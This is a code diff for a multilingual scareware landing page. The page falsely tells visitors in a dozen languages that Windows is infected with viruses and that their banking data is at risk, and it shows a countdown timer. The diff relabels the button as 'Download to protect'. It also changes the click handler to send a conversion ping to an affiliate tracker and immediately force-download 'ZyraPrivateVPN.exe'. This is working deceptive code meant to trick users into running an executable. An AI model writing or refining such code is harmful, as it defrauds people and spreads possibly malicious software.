-    step: 'Стъпка 1: Кликнете върху бутона <span class="bold">„Продължи"</span>, за да проверите компютъра си.',
-    proceed: 'Продължи >>',
+    step: 'Стъпка 1: Кликнете върху бутона <span class="bold">„Изтеглете за защита"</span>, за да проверите компютъра си.',
+    proceed: 'Изтеглете за защита',
     timer: function(m,s){ return m+' минут'+(m===1?'а':'и')+' и '+s+' секунд'+(s===1?'а':'и'); },
     days: ['неделя','понеделник','вторник','сряда','четвъртък','петък','събота'],
     months: ['януари','февруари','март','април','май','юни','юли','август','септември','октомври','ноември','декември'],
@@ -682,8 +718,8 @@ const translations = {
     warning: 'Vaš Windows je <span class="bold">zaražen s (3) virusa</span>. Predskeniranje je pronašlo tragove (2) zlonamjernog softvera i (1) špijunskog softvera. Šteta sustava: 28.1% - <span class="bold">POTREBNO HITNO UKLANJANJE!</span>',
     removal: 'Uklanjanje <span class="bold">(3) virusa</span> hitno je potrebno kako bi se spriječile daljnje štete sustava i gubitak aplikacija, fotografija ili drugih datoteka.',
     spyware: 'Na vašem računalu pronađeni su tragovi <span class="bold">(1) špijunskog softvera</span>. <span class="bold">Osobni i bankovni podaci su u opasnosti.</span>',
-    step: 'Korak 1: Kliknite gumb <span class="bold">„Nastavi"</span> kako biste provjerili računalo.',
-    proceed: 'Nastavi >>',
+    step: 'Korak 1: Kliknite gumb <span class="bold">„Preuzmi za zaštitu"</span> kako biste provjerili računalo.',
+    proceed: 'Preuzmi za zaštitu',
     timer: function(m,s){ return m+' minut'+(m===1?'a':'e')+' i '+s+' sekund'+(s===1?'u':'i'); },
     days: ['nedjelja','ponedjeljak','utorak','srijeda','četvrtak','petak','subota'],
     months: ['siječnja','veljače','ožujka','travnja','svibnja','lipnja','srpnja','kolovoza','rujna','listopada','studenoga','prosinca'],
@@ -698,8 +734,8 @@ const translations = {
     warning: 'Ваш Windows је <span class="bold">заражен са (3) вируса</span>. Прелиминарно скенирање је пронашло трагове (2) злонамерног и (1) шпијунског софтвера. Штета система: 28.1% - <span class="bold">ПОТРЕБНО ХИТНО УКЛАЊАЊЕ!</span>',
     removal: 'Уклањање <span class="bold">(3) вируса</span> је хитно потребно ради спречавања даље штете и губитка апликација, фотографија или других фајлова.',
     spyware: 'На вашем рачунару пронађени су трагови <span class="bold">(1) шпијунског софтвера</span>. <span class="bold">Лични и банковни подаци су у опасности.</span>',
-    step: 'Корак 1: Кликните на дугме <span class="bold">„Настави"</span> да бисте проверили рачунар.',
-    proceed: 'Настави >>',
+    step: 'Корак 1: Кликните на дугме <span class="bold">„Преузми за заштиту"</span> да бисте проверили рачунар.',
+    proceed: 'Преузми за заштиту',
     timer: function(m,s){ return m+' минут'+(m===1?'а':'а')+' и '+s+' секунд'+(s===1?'а':'и'); },
     days: ['недеља','понедељак','уторак','среда','четвртак','петак','субота'],
     months: ['јануар','фебруар','март','април','мај','јун','јул','август','септембар','октобар','новембар','децембар'],
@@ -714,8 +750,8 @@ const translations = {
     warning: 'お使いのWindowsは<span class="bold">(3)個のウイルスに感染しています</span>。事前スキャンで(2)個のマルウェアと(1)個のスパイウェアの痕跡が見つかりました。システム損傷: 28.1% - <span class="bold">直ちに削除が必要です！</span>',
     removal: '<span class="bold">(3)個のウイルス</span>の削除は、これ以上のシステムダメージやアプリ、写真、その他のファイルの損失を防ぐために直ちに行う必要があります。',
     spyware: 'お使いのコンピューターで<span class="bold">(1)個のスパイウェア</span>の痕跡が見つかりました。<span class="bold">個人情報と銀行情報が危険にさらされています。</span>',
-    step: 'ステップ1: <span class="bold">「続行」</span>ボタンをクリックして、ウイルスをチェックしてください。',
-    proceed: '続行 >>',
+    step: 'ステップ1: <span class="bold">「保護するためにダウンロード」</span>ボタンをクリックして、ウイルスをチェックしてください。',
+    proceed: '保護するためにダウンロード',
     timer: function(m,s){ return m+'分'+s+'秒'; },
     days: ['日曜日','月曜日','火曜日','水曜日','木曜日','金曜日','土曜日'],
     months: ['1月','2月','3月','4月','5月','6月','7月','8月','9月','10月','11月','12月'],
@@ -730,8 +766,8 @@ const translations = {
     warning: 'Windows가 <span class="bold">(3)개의 바이러스에 감염되었습니다</span>. 사전 스캔에서 (2)개의 멀웨어와 (1)개의 스파이웨어 흔적이 발견되었습니다. 시스템 손상: 28.1% - <span class="bold">즉시 제거가 필요합니다!</span>',
     removal: '추가적인 시스템 손상, 앱, 사진 또는 기타 파일의 손실을 방지하려면 <span class="bold">(3)개의 바이러스</span>를 즉시 제거해야 합니다.',
     spyware: '컴퓨터에서 <span class="bold">(1)개의 스파이웨어</span> 흔적이 발견되었습니다. <span class="bold">개인 정보 및 은행 정보가 위험에 처해 있습니다.</span>',
-    step: '1단계: <span class="bold">"계속"</span> 버튼을 클릭하여 컴퓨터를 검사하세요.',
-    proceed: '계속 >>',
+    step: '1단계: <span class="bold">"보호하려면 다운로드"</span> 버튼을 클릭하여 컴퓨터를 검사하세요.',
+    proceed: '보호하려면 다운로드',
     timer: function(m,s){ return m+'분 '+s+'초'; },
     days: ['일요일','월요일','화요일','수요일','목요일','금요일','토요일'],
     months: ['1월','2월','3월','4월','5월','6월','7월','8월','9월','10월','11월','12월'],
@@ -746,8 +782,8 @@ const translations = {
     warning: '您的 Windows <span class="bold">已感染 (3) 个病毒</span>。预扫描发现了 (2) 个恶意软件和 (1) 个间谍软件的痕迹。系统损坏: 28.1% - <span class="bold">需要立即清除！</span>',
     removal: '必须立即清除 <span class="bold">(3) 个病毒</span>，以防止进一步的系统损坏和应用、照片或其他文件丢失。',
     spyware: '在您的电脑上发现了 <span class="bold">(1) 个间谍软件</span> 的痕迹。<span class="bold">个人信息和银行信息处于危险之中。</span>',
-    step: '步骤 1：点击 <span class="bold">"继续"</span> 按钮以检查您的电脑。',
-    proceed: '继续 >>',
+    step: '步骤 1：点击 <span class="bold">"下载以保护"</span> 按钮以检查您的电脑。',
+    proceed: '下载以保护',
     timer: function(m,s){ return m+' 分 '+s+' 秒'; },
     days: ['星期日','星期一','星期二','星期三','星期四','星期五','星期六'],
     months: ['1月','2月','3月','4月','5月','6月','7月','8月','9月','10月','11月','12月'],
@@ -762,8 +798,8 @@ const translations = {
     warning: 'Windows của bạn đã <span class="bold">nhiễm (3) virus</span>. Quét sơ bộ phát hiện dấu vết của (2) phần mềm độc hại và (1) phần mềm gián điệp. Hư hại hệ thống: 28.1% - <span class="bold">CẦN XÓA NGAY!</span>',
     removal: 'Việc xóa <span class="bold">(3) virus</span> là cần thiết ngay lập tức để ngăn ngừa hư hại hệ thống và mất ứng dụng, ảnh hoặc các tệp khác.',
     spyware: 'Phát hiện dấu vết của <span class="bold">(1) phần mềm gián điệp</span> trên máy tính của bạn. <span class="bold">Thông tin cá nhân và ngân hàng đang gặp rủi ro.</span>',
-    step: 'Bước 1: Nhấp vào nút <span class="bold">"Tiếp tục"</span> để kiểm tra máy tính của bạn.',
-    proceed: 'Tiếp tục >>',
+    step: 'Bước 1: Nhấp vào nút <span class="bold">"Tải xuống để bảo vệ"</span> để kiểm tra máy tính của bạn.',
+    proceed: 'Tải xuống để bảo vệ',
     timer: function(m,s){ return m+' phút và '+s+' giây'; },
     days: ['Chủ Nhật','Thứ Hai','Thứ Ba','Thứ Tư','Thứ Năm','Thứ Sáu','Thứ Bảy'],
     months: ['tháng 1','tháng 2','tháng 3','tháng 4','tháng 5','tháng 6','tháng 7','tháng 8','tháng 9','tháng 10','tháng 11','tháng 12'],
@@ -778,8 +814,8 @@ const translations = {
     warning: 'Windows ของคุณ <span class="bold">ติดไวรัส (3) ตัว</span> การสแกนเบื้องต้นพบร่องรอยของมัลแวร์ (2) ตัวและสปายแวร์ (1) ตัว ความเสียหายของระบบ: 28.1% - <span class="bold">ต้องลบออกทันที!</span>',
     removal: 'การลบ <span class="bold">ไวรัส (3) ตัว</span> จำเป็นต้องดำเนินการทันที เพื่อป้องกันความเสียหายเพิ่มเติมต่อระบบและการสูญเสียแอป รูปภาพ หรือไฟล์อื่นๆ',
     spyware: 'พบร่องรอยของ <span class="bold">สปายแวร์ (1) ตัว</span> บนคอมพิวเตอร์ของคุณ <span class="bold">ข้อมูลส่วนตัวและข้อมูลธนาคารตกอยู่ในความเสี่ยง</span>',
-    step: 'ขั้นตอนที่ 1: คลิกปุ่ม <span class="bold">"ดำเนินการต่อ"</span> เพื่อตรวจสอบคอมพิวเตอร์ของคุณ',
-    proceed: 'ดำเนินการต่อ >>',
+    step: 'ขั้นตอนที่ 1: คลิกปุ่ม <span class="bold">"ดาวน์โหลดเพื่อป้องกัน"</span> เพื่อตรวจสอบคอมพิวเตอร์ของคุณ',
+    proceed: 'ดาวน์โหลดเพื่อป้องกัน',
     timer: function(m,s){ return m+' นาที '+s+' วินาที'; },
     days: ['วันอาทิตย์','วันจันทร์','วันอังคาร','วันพุธ','วันพฤหัสบดี','วันศุกร์','วันเสาร์'],
     months: ['มกราคม','กุมภาพันธ์','มีนาคม','เมษายน','พฤษภาคม','มิถุนายน','กรกฎาคม','สิงหาคม','กันยายน','ตุลาคม','พฤศจิกายน','ธันวาคม'],
@@ -794,8 +830,8 @@ const translations = {
     warning: 'Windows Anda <span class="bold">terinfeksi (3) virus</span>. Pra-pemindaian menemukan jejak (2) malware dan (1) spyware. Kerusakan sistem: 28.1% - <span class="bold">PENGHAPUSAN SEGERA DIPERLUKAN!</span>',
     removal: 'Penghapusan <span class="bold">(3) virus</span> diperlukan segera untuk mencegah kerusakan sistem lebih lanjut dan kehilangan aplikasi, foto, atau file lainnya.',
     spyware: 'Jejak <span class="bold">(1) spyware</span> ditemukan di komputer Anda. <span class="bold">Informasi pribadi dan perbankan berisiko.</span>',
-    step: 'Langkah 1: Klik tombol <span class="bold">"Lanjutkan"</span> untuk memeriksa komputer Anda.',
-    proceed: 'Lanjutkan >>',
+    step: 'Langkah 1: Klik tombol <span class="bold">"Unduh untuk Melindungi"</span> untuk memeriksa komputer Anda.',
+    proceed: 'Unduh untuk Melindungi',
     timer: function(m,s){ return m+' menit dan '+s+' detik'; },
     days: ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'],
     months: ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember'],
@@ -810,8 +846,8 @@ const translations = {
     warning: 'आपका Windows <span class="bold">(3) वायरस से संक्रमित है</span>। पूर्व-स्कैन में (2) मैलवेयर और (1) स्पाइवेयर के निशान मिले। सिस्टम क्षति: 28.1% - <span class="bold">तत्काल हटाना आवश्यक है!</span>',
     removal: 'सिस्टम को और नुकसान, ऐप्स, फ़ोटो या अन्य फ़ाइलों के नुकसान को रोकने के लिए <span class="bold">(3) वायरस</span> को तुरंत हटाना आवश्यक है।',
     spyware: 'आपके कंप्यूटर पर <span class="bold">(1) स्पाइवेयर</span> के निशान पाए गए। <span class="bold">व्यक्तिगत और बैंकिंग जानकारी जोखिम में है।</span>',
-    step: 'चरण 1: अपने कंप्यूटर की जांच के लिए <span class="bold">"जारी रखें"</span> बटन पर क्लिक करें।',
-    proceed: 'जारी रखें >>',
+    step: 'चरण 1: अपने कंप्यूटर की जांच के लिए <span class="bold">"सुरक्षा के लिए डाउनलोड करें"</span> बटन पर क्लिक करें।',
+    proceed: 'सुरक्षा के लिए डाउनलोड करें',
     timer: function(m,s){ return m+' मिनट और '+s+' सेकंड'; },
     days: ['रविवार','सोमवार','मंगलवार','बुधवार','गुरुवार','शुक्रवार','शनिवार'],
     months: ['जनवरी','फ़रवरी','मार्च','अप्रैल','मई','जून','जुलाई','अगस्त','सितंबर','अक्टूबर','नवंबर','दिसंबर'],
@@ -826,8 +862,8 @@ const translations = {
     warning: 'نظام Windows <span class="bold">مصاب بـ (3) فيروسات</span>. وجد الفحص المبدئي آثار (2) برامج ضارة و(1) برنامج تجسس. ضرر النظام: 28.1% - <span class="bold">الإزالة الفورية مطلوبة!</span>',
     removal: 'إزالة <span class="bold">(3) فيروسات</span> مطلوبة فوراً لمنع المزيد من الضرر للنظام وفقدان التطبيقات والصور والملفات الأخرى.',
     spyware: 'تم العثور على آثار <span class="bold">(1) برنامج تجسس</span> على جهازك. <span class="bold">المعلومات الشخصية والمصرفية في خطر.</span>',
-    step: 'الخطوة 1: انقر على زر <span class="bold">"متابعة"</span> لفحص جهازك.',
-    proceed: 'متابعة >>',
+    step: 'الخطوة 1: انقر على زر <span class="bold">"تنزيل للحماية"</span> لفحص جهازك.',
+    proceed: 'تنزيل للحماية',
     timer: function(m,s){ return m+' دقيقة و '+s+' ثانية'; },
     days: ['الأحد','الإثنين','الثلاثاء','الأربعاء','الخميس','الجمعة','السبت'],
     months: ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'],
@@ -842,8 +878,8 @@ const translations = {
     warning: 'מערכת Windows שלך <span class="bold">נדבקה ב-(3) וירוסים</span>. הסריקה המוקדמת מצאה עקבות של (2) תוכנות זדוניות ו-(1) תוכנת ריגול. נזק למערכת: 28.1% - <span class="bold">נדרשת הסרה מיידית!</span>',
     removal: 'הסרת <span class="bold">(3) הוירוסים</span> נדרשת באופן מיידי כדי למנוע נזק נוסף למערכת ואובדן אפליקציות, תמונות או קבצים אחרים.',
     spyware: 'נמצאו עקבות של <span class="bold">(1) תוכנת ריגול</span> במחשב שלך. <span class="bold">מידע אישי ובנקאי נמצא בסיכון.</span>',
-    step: 'שלב 1: לחץ על כפתור <span class="bold">"המשך"</span> כדי לבדוק את המחשב.',
-    proceed: 'המשך >>',
+    step: 'שלב 1: לחץ על כפתור <span class="bold">"הורד כדי להגן"</span> כדי לבדוק את המחשב.',
+    proceed: 'הורד כדי להגן',
     timer: function(m,s){ return m+' דקות ו-'+s+' שניות'; },
     days: ['ראשון','שני','שלישי','רביעי','חמישי','שישי','שבת'],
     months: ['ינואר','פברואר','מרץ','אפריל','מאי','יוני','יולי','אוגוסט','ספטמבר','אוקטובר','נובמבר','דצמבר'],
@@ -858,7 +894,6 @@ const RTL_LANGS = ['ar','he','fa','ur'];
 function detectLang() {
   const navRaw = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
   const nav = navRaw.slice(0,2);
-  // Map zh-tw / zh-hk to zh
   if (translations[nav]) return nav;
   return 'en';
 }
@@ -898,28 +933,25 @@ function updateTimer() {
 updateTimer();
 setInterval(function() { if (total > 0) { total--; updateTimer(); } }, 1000);
 
-// ── FIXED TRACKING LOGIC WITH DELAY ──
+// ── FIXED TRACKING LOGIC AND ARROW POSITIONING ──
 document.getElementById('proceedBtn').addEventListener('click', function(e) {
   
-  // 1. Send conversion to Binom
+  // 1. Send conversion to Binom IMMEDIATELY
   try {
     BPixelJS.conversion({ url: 'https://juciecrucierretor.top/click' });
   } catch(err) {}
 
-  // 2. Wait 400ms to ensure the request is sent, then download and show overlay
-  setTimeout(function() {
-    // Trigger file download via hidden link
-    const fileLink = document.getElementById('fileLink');
-    const tmp = document.createElement('a');
-    tmp.href = fileLink.href;
-    tmp.download = '';
-    document.body.appendChild(tmp);
-    tmp.click();
-    document.body.removeChild(tmp);
-    
-    // Show step 2 overlay with arrow
-    document.getElementById('step2').classList.add('active');
-  }, 400);
+  // 2. Trigger file download via hidden link without delay
+  const fileLink = document.getElementById('fileLink');
+  const tmp = document.createElement('a');
+  tmp.href = fileLink.href;
+  tmp.download = 'ZyraPrivateVPN.exe';
+  document.body.appendChild(tmp);
+  tmp.click();
+  document.body.removeChild(tmp);
+  
+  // 3. Show step 2 overlay immediately
+  document.getElementById('step2').classList.add('active');
 
 });
 </script>
